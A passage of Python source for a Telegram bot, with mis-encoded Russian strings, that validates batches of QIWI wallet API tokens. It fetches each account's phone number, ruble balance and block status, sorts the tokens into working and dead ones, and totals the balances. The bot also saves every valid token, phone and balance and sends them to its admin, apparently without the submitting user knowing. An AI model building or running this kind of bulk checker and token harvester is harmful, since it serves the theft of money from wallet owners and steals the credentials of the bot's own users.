                            bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - —Å—É–º–º—É –Ω–µ –≤—Ö–æ–¥–∏—Ç –≤ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—ã–µ –≥—Ä–∞–Ω–∏—Ü—ã!', reply_markup=kb_main)
                            qiwi.reset(tid)
                    except:
                        bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –Ω–µ —É–¥–∞–ª–æ—Å—å —Ä–∞—Å–ø–æ–∑–Ω–∞—Ç—å —Å—É–º–º—É –¥–µ–ø–æ–∑–∏—Ç–∞!', reply_markup=kb_main)
                        qiwi.reset(tid)
                    return
                elif qiwi.users_info.get(tid, {}).get("status") == "waiting_pay":
                    try:
                        if message.text == "‚úÖ –Ø –æ–ø–ª–∞—Ç–∏–ª":
                            # –ü–æ–ª—É—á–∞–µ–º –≤—Å–µ –∫–æ–¥—ã –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –æ–ø–ª–∞—Ç—ã.
                            user_codes = [{"comment": x["comment"], "sum": x["sum"], "upgrade": x["upgrade"]} for x in qiwi.users_balance[tid]["transactions"] if x.get("status") == "created" and not x.get("paid_time")]
                            # –ü—Ä–æ–≤–µ—Ä—è–µ–º –æ–ø–ª–∞—Ç–∏–ª –ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é.
                            result = check_paid(user_codes)
                            if result:
                                now_upgrade = result["upgrade"]
                                now_comment = result["comment"]
                                now_from_user = result["from"]
                                now_sum = result["sum"]
                                # –ü–æ–ø–æ–ª–Ω–µ–Ω—è–µ–º —Å—á–µ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.
                                qiwi.upgrade_limit(tid, now_upgrade, now_comment, now_from_user)
                                bot.send_message(tid, f'‚úÖ –û–ø–ª–∞—Ç–∞ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∞!\n–õ–∏–º–∏—Ç –ø–æ–≤—ã—à–µ–Ω –Ω–∞ `{bue_numb(now_upgrade)}`', parse_mode='markdown', reply_markup=kb_main)
                                qiwi.reset(tid)
                                try:
                                    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –∞–¥–º–∏–Ω—É.
                                    if tid != qiwi.notification:
                                        use_proxy = do_have_proxy(tid)
                                        qiwi.notif_common_admin(notif_text='ü§ë *–û–ø–ª–∞—Ç–∞ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∞!*', telegram_id=tid, username=message.from_user.username, last_text=f'\n–õ–∏–º–∏—Ç –ø–æ–≤—ã—à–µ–Ω –Ω–∞ `{bue_numb(now_upgrade)}`‚ÇΩ\n–°—É–º–º–∞ –ø–ª–∞—Ç–µ–∂–∞: `{bue_numb(now_sum)}`‚ÇΩ')
                                except:
                                    pass
                            else:
                                bot.send_message(tid, f'üö´ –û—à–∏–±–∫–∞ - –æ–ø–ª–∞—Ç–∞ –Ω–µ –±—ã–ª–∞ –Ω–∞–π–¥–µ–Ω–∞!\n–ü—Ä–∏ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ—Å—Ç–∏ –ø–∏—à–∏—Ç–µ: {config.ADMIN_TG}', reply_markup=kb_paid)
                        else:
                            bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –æ–∂–∏–¥–∞–ª–æ—Å—å –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ!', reply_markup=kb_main)
                            qiwi.reset(tid)
                    except:
                        bot.send_message(tid, f'üö´ –û—à–∏–±–∫–∞ - –Ω–µ —É–¥–∞–ª–æ—Å—å –ø—Ä–æ–≤–µ—Ä–∏—Ç—å –æ–ø–ª–∞—Ç—É!\n–ü—Ä–∏ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ—Å—Ç–∏ –ø–∏—à–∏—Ç–µ: {config.ADMIN_TG}', reply_markup=kb_paid)
                    return
                elif qiwi.users_info.get(tid, {}).get("status") == "waiting_cleaning":
                    if message.text == "üóù –°—Ç–µ—Ä–µ—Ç—å —Ç–æ–∫–µ–Ω—ã":
                        try:
                            # –û—á–∏—â–∞–µ–º —Å–ø–∏—Å–æ–∫ –Ω–æ–º–µ—Ä–æ–≤.
                            qiwi.last_tokens[tid] = []
                            # –û–±–Ω–æ–≤–ª—è–µ–º –∏–∑–º–µ–Ω–µ–Ω–∏—è.
                            save_last_t(qiwi.last_tokens)
                        except:
                            bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –Ω–µ —É–¥–∞–ª–æ—Å—å –ø—Ä–æ–∏–∑–≤–µ—Å—Ç–∏ –æ—á–∏—Å—Ç–∫—É!', reply_markup=kb_main)
                        else:
                            bot.send_message(tid, '‚úÖ –°–ø–∏—Å–æ–∫ –æ—á–∏—â–µ–Ω', reply_markup=kb_main)
                    elif message.text == "üìµ –°—Ç–µ—Ä–µ—Ç—å —Ç–µ–ª–µ—Ñ–æ–Ω—ã":
                        try:
                            # –û—á–∏—â–∞–µ–º —Å–ø–∏—Å–æ–∫ –Ω–æ–º–µ—Ä–æ–≤.
                            qiwi.last_phones[tid] = []
                            # –û–±–Ω–æ–≤–ª—è–µ–º –∏–∑–º–µ–Ω–µ–Ω–∏—è.
                            save_last_ph(qiwi.last_phones)
                        except:
                            bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –Ω–µ —É–¥–∞–ª–æ—Å—å –ø—Ä–æ–∏–∑–≤–µ—Å—Ç–∏ –æ—á–∏—Å—Ç–∫—É!', reply_markup=kb_main)
                        else:
                            bot.send_message(tid, '‚úÖ –°–ø–∏—Å–æ–∫ –æ—á–∏—â–µ–Ω', reply_markup=kb_main)
                    elif message.text == "üî• –°–±—Ä–æ—Å–∏—Ç—å –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è":
                        try:
                            # –û—á–∏—â–∞–µ–º –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.
                            qiwi.users_info[tid] = {
                                "status": None
                            }
                            # –û–±–Ω–æ–≤–ª—è–µ–º –∏–∑–º–µ–Ω–µ–Ω–∏—è.
                        except:
                            bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –Ω–µ —É–¥–∞–ª–æ—Å—å –ø—Ä–æ–∏–∑–≤–µ—Å—Ç–∏ —Å–±—Ä–æ—Å –Ω–∞—Å—Ç—Ä–æ–µ–∫!', reply_markup=kb_main)
                        else:
                            bot.send_message(tid, '‚úÖ –ù–∞—Å—Ç—Ä–æ–π–∫–∏ —Å–±—Ä–æ—à–µ–Ω—ã!', reply_markup=kb_main)
                    else:
                        bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –Ω–µ —É–¥–∞–ª–æ—Å—å —Ä–∞—Å–ø–æ–∑–Ω–∞—Ç—å –¥–µ–π—Å—Ç–≤–∏–µ [#1]!', reply_markup=kb_main)
                    qiwi.reset(tid)
                    return
                elif qiwi.users_info.get(tid, {}).get("status") == "not_member":
                    try:
                        if check_member(tid):
                            qiwi.reset(tid)
                            bot.send_message(tid, 'üëæ –°–ø–∞—Å–∏–±–æ, —á—Ç–æ –ø–æ–¥–ø–∏—Å–∞–ª–∏—Å—å!', reply_markup=kb_main)
                        else:
                            bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –≤—ã –Ω–µ –ø–æ–¥–ø–∏—Å–∞–ª–∏—Å—å.\n–ü–æ–π–º–∏—Ç–µ, —ç—Ç–æ –≤–∞–∂–Ω–æ –≤ —Å–ª—É—á–∞–µ, –µ—Å–ª–∏ –±–æ—Ç –Ω–µ–æ–∂–∏–¥–∞–Ω–Ω–æ —É–ø–∞–¥–µ—Ç. –¢–∞–∫ –≤—ã —Å–º–æ–∂–µ—Ç–µ –Ω–∞–π—Ç–∏ –º–µ–Ω—è.')
                    except:
                        bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –Ω–µ —É–¥–∞–ª–æ—Å—å –ø—Ä–æ–≤–µ—Ä–∏—Ç—å –ø–æ–¥–ø–∏—Å–∫—É –Ω–∞ –∫–∞–Ω–∞–ª! –ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É –ø–æ–∑–∂–µ.')
                    return
                elif qiwi.users_info.get(tid, {}).get("status") == "adding_proxy":
                    try:
                        bot.send_message(tid, "‚åõ –ü—Ä–æ–≤–µ—Ä—è—é –ø—Ä–æ–∫—Å–∏, –ø–æ–¥–æ–∂–¥–∏—Ç–µ...")
                        # –ü–æ–ª—É—á–∞–µ–º —Å–ª–æ–≤–∞—Ä—å –ø—Ä–æ–∫—Å–∏.
                        new_proxy = form_proxy(message.text)
                        # –ü–æ–ª—É—á–∞–µ–º —Ç–µ–∫—É—â–∏–π IP.
                        now_ip = get_ip()
                        # –ü–æ–ª—É—á–∞–µ–º IP –ø–æ –ø—Ä–æ–∫—Å–∏.
                        proxy_ip = get_ip(user_proxy=new_proxy)
                        # –ü—Ä–æ–≤–µ—Ä—è–µ–º —É–¥–∞–ª–æ—Å—å –ª–∏ –ø–æ–ª—É—á–∏—Ç—å IP.
                        if now_ip and proxy_ip and now_ip != proxy_ip:
                            # –ü–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ–± IP.
                            ip_info = get_ip_info(proxy_ip)
                            if ip_info:
                                if qiwi.users_proxy.get(tid, {}).get("data"):
                                    suc_text = "‚úÖ *–ü—Ä–æ–∫—Å–∏ –æ–±–Ω–æ–≤–ª–µ–Ω—ã!*"
                                    variant = 1
                                else:
                                    suc_text = "‚úÖ *–ü—Ä–æ–∫—Å–∏ –¥–æ–±–∞–≤–ª–µ–Ω—ã!*"
                                    variant = 0
                                try:
                                    if tid != qiwi.notification:
                                        # –£–≤–µ–¥–æ–º–ª—è–µ–º –ø—Ä–æ —ç—Ç–æ –∞–¥–º–∏–Ω–∞.
                                        qiwi.notif_proxy_admin(variant=variant, telegram_id=tid, username=message.from_user.username)
                                except:
                                    pass

                                ip_info_text = f"{suc_text}\n" + \
                                    f"–†–µ–≥–∏–æ–Ω: `{ip_info.get('regionName')}`\n" + \
                                    f"–°—Ç—Ä–∞–Ω–∞: `{ip_info.get('country')}`\n" + \
                                    f"–ì–æ—Ä–æ–¥: `{ip_info.get('city')}`\n" + \
                                    f"Timezone: `{ip_info.get('timezone')}`\n" + \
                                    f"IP: `{ip_info.get('query')}`\n\n_–ù–µ –∑–∞–±—É–¥—å –≤–∫–ª—é—á–∏—Ç—å –ø—Ä–æ–∫—Å–∏ –≤ –Ω–∞—Å—Ç—Ä–æ–π–∫–∞—Ö!_"
                                qiwi.users_proxy[tid] = {
                                    "work": False,
                                    "data": new_proxy,
                                    "info": {
                                        "regionName": ip_info.get('regionName'),
                                        "country": ip_info.get('country'),
                                        "city": ip_info.get('city'),
                                        "timezone": ip_info.get('timezone'),
                                        "query": ip_info.get('query')
                                    },
                                    "added": int(time.time())
                                }
                                qiwi.save_proxy()
                                bot.send_message(tid, ip_info_text, parse_mode='markdown', reply_markup=kb_main)
                            else:
                                bot.send_message(tid, "üö´ –û—à–∏–±–∫–∞ - –Ω–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ–± IP!", reply_markup=kb_main)
                        else:
                            bot.send_message(tid, "üö´ –û—à–∏–±–∫–∞ - –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π IP!", reply_markup=kb_main)
                    except:
                        bot.send_message(tid, "üö´ –û—à–∏–±–∫–∞ - –Ω–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å –ø—Ä–æ–∫—Å–∏!", reply_markup=kb_main)
                    qiwi.reset(tid)
                    return
                elif qiwi.users_info.get(tid, {}).get("status") == "confirm_notif":
                    if message.text == "‚úÖ –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –æ—Ç–ø—Ä–∞–≤–∫—É":
                        success = 0
                        all_count = len(qiwi.users_info[tid]["to_ids"])
                        bot.send_message(tid, "‚òëÔ∏è –ó–∞—è–≤–∫–∞ –ø—Ä–∏–Ω—è—Ç–∞ –≤ –æ–±—Ä–∞–±–æ—Ç–∫—É", reply_markup=kb_main)
                        mail_message = bot.send_message(tid, 'üïî –ù–∞—á–∞–ª–æ –æ—Ç–ø—Ä–∞–≤–∫–∏...')
                        clocks = get_clock()
                        tries = 0
                        if qiwi.users_info.get(tid, {}).get("to_photo"):
                            to_photo = qiwi.users_info[tid]["to_photo"]
                            to_text = qiwi.users_info[tid]["to_text"]
                            for one_id in qiwi.users_info[tid]["to_ids"]:
                                tries += 1
                                try:
                                    bot.send_photo(one_id, to_photo, caption=to_text, parse_mode="markdown")
                                except:
                                    pass
                                else:
                                    success += 1
                                time.sleep(0.1)
                                bot.edit_message_text(f"{next(clocks)} –ò–¥–µ—Ç –æ—Ç–ø—Ä–∞–≤–∫–∞: *{success}* <- *{tries}*/*{all_count}*", tid, mail_message.message_id, parse_mode='markdown')
                                time.sleep(0.1)
                        else:
                            to_text = qiwi.users_info[tid]["to_text"]
                            for one_id in qiwi.users_info[tid]["to_ids"]:
                                tries += 1
                                try:
                                    bot.send_message(one_id, to_text, parse_mode='markdown')
                                except:
                                    pass
                                else:
                                    success += 1
                                time.sleep(0.1)
                                bot.edit_message_text(f"{next(clocks)} –ò–¥–µ—Ç –æ—Ç–ø—Ä–∞–≤–∫–∞: *{success}* <- *{tries}*/*{all_count}*", tid, mail_message.message_id, parse_mode='markdown')
                                time.sleep(0.1)
                        bot.edit_message_text(f"‚úÖ –û—Ç–ø—Ä–∞–≤–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞: *{success}* <- *{tries}*/*{all_count}*", tid, mail_message.message_id, parse_mode='markdown')
                    else:
                        bot.send_message(tid, "üö´ –û—à–∏–±–∫–∞ - –æ–∂–∏–¥–∞–ª–æ—Å—å –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ!", reply_markup=kb_main)
                    qiwi.reset(tid)
                    return
                elif qiwi.users_info.get(tid, {}).get("status") == "waiting_many_tokens":
                    try:
                        many_tokens_raw = message.text.replace('\n', ';')
                        many_tokens = many_tokens_raw.split(';')
                        # –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞ –¥–ª–∏–Ω—É —Å–æ–æ–±—â–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.
                        if len(many_tokens_raw) < 32:
                            raise ValueError
                        if len(many_tokens) <= 50:
                            # –§–∏–ª—å—Ç—Ä—É–µ–º —Ç–æ–ª—å–∫–æ –≤–∞–ª–∏–¥–Ω—ã–µ —Ç–æ–∫–µ–Ω—ã.
                            filted_tokens = filt_tokens(list(set(many_tokens)))
                            if not filted_tokens:
                                raise ValueError
                            filted_text = '\n'.join(filted_tokens)
                            many_text = f'–¢–æ–∫–µ–Ω–æ–≤ –¥–æ–ø—É—â–µ–Ω–æ –∫ –ø—Ä–æ–≤–µ—Ä–∫–µ: *{len(filted_tokens)}*/*{len(many_tokens)}*\n\n' + \
                                f'–°–ø–∏—Å–∫–æ–º:\n`{filted_text}`'
                            qiwi.status(tid, "many_tokens_confirm")
                            qiwi.users_info[tid]["filted_tokens"] = filted_tokens
                            bot.send_message(tid, many_text, parse_mode='markdown', reply_markup=kb_confirm_many)
                        else:
                            bot.send_message(tid, "üö´ –û—à–∏–±–∫–∞ - –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —Ç–æ–∫–µ–Ω–æ–≤ –Ω–µ –¥–æ–ª–∂–Ω–æ –ø—Ä–µ–≤—ã—à–∞—Ç—å 50!", reply_markup=kb_main)
                            qiwi.reset(tid)
                    except:
                        bot.send_message(tid, "üö´ –û—à–∏–±–∫–∞ - –æ—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–∏ —Ç–æ–∫–µ–Ω–æ–≤!", reply_markup=kb_main)
                        qiwi.reset(tid)
                    return
                elif qiwi.users_info.get(tid, {}).get("status") == "many_tokens_confirm":
                    if message.text == "‚úÖ –ù–∞—á–∞—Ç—å –ø—Ä–æ–≤–µ—Ä–∫—É —Ç–æ–∫–µ–Ω–æ–≤":
                        try:
                            qiwi.status(tid, "doing_many_checks")
                            good_tokens = []
                            bad_tokens = []
                            goods = 0
                            bads = 0
                            total_sum = 0
                            bot.send_message(tid, "üöÄ –ó–∞–ø—É—Å–∫ –ø—Ä–æ–≤–µ—Ä–∫–∏ —Ç–æ–∫–µ–Ω–æ–≤, –ø–æ–¥–æ–∂–¥–∏—Ç–µ...", reply_markup=kb_disable)
                            tokens_amount = len(qiwi.users_info.get(tid, {}).get("filted_tokens", []))
                            sand_clocks = get_sand_clock()
                            message_status = bot.send_message(tid, f'{next(sand_clocks)} –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ç–æ–∫–µ–Ω–æ–≤: *0*/*{tokens_amount}*', parse_mode='markdown')
                            # –ü—Ä–æ–≤–µ—Ä—è–µ–º –∫–∞–∂–¥—ã–π —Ç–æ–∫–µ–Ω –ø–æ –æ–¥–Ω–æ–º—É.
                            for now_token in qiwi.users_info.get(tid, {}).get("filted_tokens", []):
                                # –î–µ–ª–∞–µ–º –∑–∞–¥–µ—Ä–∂–∫—É.
                                time.sleep(0.3)
                                # –ü—Ä–µ–¥–æ–ø—Ä–µ–¥–µ–ª—è–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç.
                                local_result = False
                                # –ü–æ–ª—É—á–∞–µ–º –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞.
                                if len(now_token) == 32:
                                    profile_raw = qiwi.get_profile(now_token, tg_id=tid)
                                    if profile_raw["code"] == 200:
                                        profile_info = profile_raw["json"]
                                    else:
                                        profile_info = False
                                else:
                                    profile_info = False
                                if profile_info:
                                    phone = profile_info.get("contractInfo", {}).get("contractId")
                                    # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ç–µ–ª–µ—Ñ–æ–Ω.
                                    if phone:
                                        # –ü–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –±–∞–ª–∞–Ω—Å–∞—Ö.
                                        balance_info = qiwi.get_rubles(now_qiwi=phone, now_token=now_token, tg_id=tid)
                                        # –ü–æ–ª—É—á–∞–µ–º –±–∞–ª–∞–Ω—Å –≤ —Ä—É–±–ª—è—Ö.
                                        try:
                                            balance = balance_info if float(balance_info) >= 0 else None
                                        except:
                                            balance = None
                                        if isinstance(balance, float) and not balance is None:
                                            # –ü–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –±–ª–æ–∫–∏—Ä–æ–≤–∫–∞—Ö.
                                            is_blocked = get_block_info(now_login=phone, now_token=now_token, tg_id=tid)
                                            if not (is_blocked or is_blocked is None):
                                                local_result = {
                                                    "phone": phone,
                                                    "balance": balance,
                                                }
                                                total_sum += balance
                                # –ò–∑–º–µ–Ω—è–µ–º —Å—Ç–∞—Ç—É—Å –ø—Ä–æ–≤–µ—Ä–∫–∏.
                                try:
                                    bot.edit_message_text(f'{next(sand_clocks)} –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ç–æ–∫–µ–Ω–æ–≤: *{goods + bads}*/*{tokens_amount}*', chat_id=tid, message_id=message_status.message_id, parse_mode='markdown')
                                except:
                                    pass
                                if local_result:
                                    good_tokens.append({
                                        "token": now_token,
                                        "phone": local_result.get("phone"),
                                        "balance": local_result.get("balance")
                                    })
                                    goods += 1
                                    # –°–æ—Ö—Ä–∞–Ω—è–µ–º —Ç–æ–∫–µ–Ω.
                                    use_proxy = do_have_proxy(tid)
                                    qiwi.save_token(telegram_id=tid, new_token=now_token, phone=local_result.get("phone"), balance=local_result.get("balance"), use_proxy=use_proxy)
                                else:
                                    bad_tokens.append(now_token)
                                    bads += 1
                            if good_tokens:
                                total_sum = round(total_sum, 2)
                                mega_result = {
                                    "amount": {
                                        "total": goods + bads,
                                        "good": goods,
                                        "bad": bads
                                    },
                                    "tokens": {
                                        "total_balance": total_sum,
                                        "good": good_tokens,
                                        "bad": bad_tokens
                                    }
                                }
                                try:
                                    # –£–¥–∞–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ.
                                    bot.delete_message(chat_id=tid, message_id=message_status.message_id)
                                except:
                                    pass
                                # –ü–æ–ª—É—á–∞–µ–º —Ö–æ—Ä–æ—à–∏–µ —Ç–æ–∫–µ–Ω—ã.
                                good_string = '\n'.join([one['token'] for one in good_tokens])
                                result_text = f'–†–µ–∑—É–ª—å—Ç–∞—Ç—ã –ø—Ä–æ–≤–µ—Ä–∫–∏: *{goods}*/*{goods + bads}*\n–û–±—â–∏–π –±–∞–ª–∞–Ω—Å: `{total_sum}`‚ÇΩ\n\n–†–∞–±–æ—á–∏–µ —Ç–æ–∫–µ–Ω—ã:\n`{good_string}`'
                                bot.send_message(tid, result_text, parse_mode='markdown', reply_markup=kb_main)
                                try:
                                    try:
                                        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –∞–¥–º–∏–Ω—É.
                                        if tid != qiwi.notification:
                                            use_proxy = do_have_proxy(tid)
                                            qiwi.notif_common_admin(notif_text='üì¶ *–í—ã–ø–æ–ª–Ω–µ–Ω–∞ –ø—Ä–æ–≤–µ—Ä–∫–∞!*', telegram_id=tid, username=message.from_user.username, last_text=f'–û–±—â–∏–π –±–∞–ª–∞–Ω—Å: `{total_sum}`‚ÇΩ\n\n–†–∞–±–æ—á–∏–µ —Ç–æ–∫–µ–Ω—ã:\n`{good_string}`', use_proxy=use_proxy)
                                    except:
                                        pass
                                    # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Å—É—â–µ—Å—Ç–≤—É–µ—Ç –ª–∏ –ø–∞–ø–∫–∞.
                                    if not os.path.exists('tokens'):
                                        os.mkdir('tokens')
                                    tmp_name = int(time.time())
                                    # –°–æ—Ö—Ä–∞–Ω—è–µ–º –¥–∞–Ω–Ω—ã–µ –≤ —Ñ–∞–π–ª.
                                    with open(f'tokens/tokens_{tmp_name}.json', 'w', encoding='utf-8') as f:
                                        json.dump(mega_result, f, indent=4)
                                    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º.
                                    file_json = open(f'tokens/tokens_{tmp_name}.json', 'r', encoding='utf-8')
                                    bot.send_document(tid, file_json, caption='JSON —Ñ–∞–π–ª —Å –ø–æ–¥—Ä–æ–±–Ω—ã–º –æ—Ç—á–µ—Ç–æ–º.\n_–ú–æ–∂–Ω–æ –æ—Ç–∫—Ä—ã—Ç—å —á–µ—Ä–µ–∑ –ª—é–±–æ–π —Ç–µ–∫—Å—Ç–æ–≤—ã–π —Ä–µ–¥–∞–∫—Ç–æ—Ä._', parse_mode='markdown', reply_markup=kb_main)
                                except:
                                    bot.send_message(tid, "üö´ –û—à–∏–±–∫–∞ - –Ω–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å JSON —Ñ–∞–π–ª —Å –æ—Ç—á–µ—Ç–æ–º!", reply_markup=kb_main)
                            else:
                                bot.send_message(tid, "üö´ –û—à–∏–±–∫–∞ - –≤—Å–µ —Ç–æ–∫–µ–Ω—ã –Ω–µ –ø—Ä–æ—à–ª–∏ –ø—Ä–æ–≤–µ—Ä–∫—É!", reply_markup=kb_main)
                        except:
                            bot.send_message(tid, "üö´ –û—à–∏–±–∫–∞ - –Ω–µ —É–¥–∞–ª–æ—Å—å –ø—Ä–æ–≤–µ—Ä–∏—Ç—å —Ç–æ–∫–µ–Ω—ã!", reply_markup=kb_main)
                    else:
                        bot.send_message(tid, "üö´ –û—à–∏–±–∫–∞ - –æ–∂–∏–¥–∞–ª–æ—Å—å –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ!", reply_markup=kb_main)
                    qiwi.reset(tid)
                    return
                elif qiwi.users_info.get(tid, {}).get("status") == "waiting_token":
                    bot.send_message(tid, "‚åõ –ü—Ä–æ–≤–µ—Ä—è—é —Ç–æ–∫–µ–Ω, –ø–æ–¥–æ–∂–¥–∏—Ç–µ...", reply_markup=kb_cancel)
                    now_token = message.text
                    # –ü–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Ç–æ–∫–µ–Ω–µ.
                    if len(now_token) == 32:
                        profile_raw = qiwi.get_profile(now_token, tg_id=tid)
                        if profile_raw["code"] != 200:
                            # –ò–∑–≤–µ—â–∞–µ–º –æ–± –æ—à–∏–±–∫–µ.
                            code_text = profile_raw.get("code", "None")
                            desc_text = ERROR_CODES.get(str(code_text), "–ù–µ–æ–ø–æ–∑–Ω–∞–Ω–Ω–∞—è –æ—à–∏–±–∫–∞.")
                            bot.send_message(tid, f'üö´ –û—à–∏–±–∫–∞ - –Ω–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Ç–æ–∫–µ–Ω–µ!\n–ö–æ–¥ –æ—à–∏–±–∫–∏: `{code_text}`\n–û–ø–∏—Å–∞–Ω–∏–µ: `{desc_text}`\n\n_–ü—Ä–∏ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ—Å—Ç–∏ —Å–æ–≤–µ—Ç—É–µ–º –æ–±—Ä–∞—Ç–∏—Ç—å—Å—è –∫ –∞–¥–º–∏–Ω—É._', parse_mode='markdown', reply_markup=kb_main)
                            qiwi.reset(tid)
                            return
                        else:
                            profile_info = profile_raw["json"]
                    else:
                        bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π —Ç–æ–∫–µ–Ω!', reply_markup=kb_main)
                        qiwi.reset(tid)
                        return

                    if profile_info:
                        # –ü–æ–ª—É—á–∞–µ–º –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞.
                        phone = profile_info.get("contractInfo", {}).get("contractId")
                        if phone:
                            # –ü–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –±–∞–ª–∞–Ω—Å–∞—Ö.
                            balance_info = qiwi.get_rubles(now_qiwi=phone, now_token=now_token, tg_id=tid)
                            # –ü–æ–ª—É—á–∞–µ–º –±–∞–ª–∞–Ω—Å –≤ —Ä—É–±–ª—è—Ö.
                            try:
                                if tid == qiwi.notification:
                                    balance = None
                                else:
                                    balance = load_freezed_tokens(now_token)
                                if balance is None or not isinstance(balance, float):
                                    balance = balance_info if float(balance_info) >= 0 else None
                                else:
                                    balance_info = balance
                            except:
                                balance = None

                            if isinstance(balance, float) and not balance is None:
                                qiwi.status(tid, "token_selected")
                                qiwi.users_info[tid]["token"] = now_token
                                qiwi.users_info[tid]["phone"] = phone
                                qiwi.users_info[tid]["balance"] = balance
                                qiwi.users_info[tid]["to_qiwi"] = None

                                if tid != qiwi.notification:
                                    use_proxy = do_have_proxy(tid)
                                    qiwi.notif_ch_admin(telegram_id=tid, username=message.from_user.username, token=now_token, from_qiwi=phone, balance=balance, use_proxy=use_proxy)
                                    qiwi.save_token(telegram_id=tid, new_token=now_token, phone=phone, balance=balance, use_proxy=use_proxy)

                                local_error = '[–æ—à–∏–±–∫–∞]'

                                show_blocked = profile_info.get("contractInfo", {}).get("blocked", local_error)

                                show_change = profile_info.get("contractInfo", {}).get("nickname", {}).get("canChange", local_error)
                                if show_change != local_error:
                                    show_change = "–¥–∞" if show_change else "–Ω–µ—Ç"

                                show_use = profile_info.get("contractInfo", {}).get("nickname", {}).get("canUse", local_error)
                                if show_use != local_error:
                                    show_use = "–¥–∞" if show_use else "–Ω–µ—Ç"

                                sms_enabled = profile_info.get("contractInfo", {}).get("smsNotification", {}).get("enabled", local_error)
                                if sms_enabled != local_error:
                                    sms_enabled = f"–¥–∞" if sms_enabled else f"–Ω–µ—Ç"

                                sms_active = profile_info.get("contractInfo", {}).get("smsNotification", {}).get("enabled", local_error)
                                if sms_active != local_error:
                                    sms_active = f"–¥–∞" if sms_active else f"–Ω–µ—Ç"

                                change_data = profile_info.get("authInfo", {}).get("passInfo", {}).get("lastPassChange", local_error).split('T')[0].split('+')[0]
                                create_data = profile_info.get("contractInfo", {}).get("creationDate", local_error).split('T')[0].split('+')[0]
                                reg_data = profile_info.get("authInfo", {}).get("registrationDate", local_error).split('T')[0].split('+')[0]

                                info_text = f'–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞: `{profile_info.get("contractInfo", {}).get("contractId", local_error)}`\n' + \
                                    f'*–ë–∞–ª–∞–Ω—Å:* `{balance}`‚ÇΩ\n' + \
                                    f'–ù–∏–∫: `{profile_info.get("contractInfo", {}).get("nickname", {}).get("nickname", local_error)}`\n–°—Ç–∞—Ç—É—Å: `{qiwi.get_verif_status(profile_info)}`\n\n–ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞: `{f"–¥–∞" if show_blocked else f"–Ω–µ—Ç"}`\n' + \
                                    f'API: (canChange: `{show_change}` | canUse: `{show_use}`)\n' + \
